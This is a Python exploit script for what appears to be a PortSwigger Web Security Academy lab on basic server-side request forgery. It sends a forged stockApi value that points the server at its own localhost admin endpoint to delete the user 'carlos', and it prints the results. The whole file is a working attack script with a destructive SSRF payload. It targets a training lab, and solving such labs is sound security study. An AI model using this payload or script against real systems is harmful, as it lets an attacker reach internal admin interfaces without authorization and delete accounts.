# === Standard Library ===
import time

# === Third-Party ===
try:
    import requests
except ImportError:
    raise ImportError("Install 'requests' with: pip install requests")

# === User Configuration ===
BASE_URL = "https://0a4c000e031174c980a2807d001400f4.web-security-academy.net"
PROXY = {
    "http": "http://127.0.0.1:8080",   # Optional: for Burp visibility
    "https": "http://127.0.0.1:8080"
}
USE_PROXY = False

# === Admin Delete Endpoint (SSRF Payload) ===
PAYLOAD = "http://localhost/admin/delete?username=carlos"

# === Exploit Function ===
def trigger_basic_ssrf():
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = f"stockApi={PAYLOAD}"

    print(f"[*] Sending SSRF payload to: {PAYLOAD}")
    res = requests.post(
        f"{BASE_URL}/product/stock",
        data=data,
        headers=headers,
        proxies=PROXY if USE_PROXY else None
    )

    if res.status_code == 200:
        print("[+] Request delivered successfully.")
        print("[*] Check the lab UI — user 'carlos' should be deleted.")
    else:
        print(f"[-] Exploit may have failed. Status Code: {res.status_code}")

# === Main ===
if __name__ == "__main__":
    print("[*] Launching Basic SSRF Attack on localhost...")
    trigger_basic_ssrf()
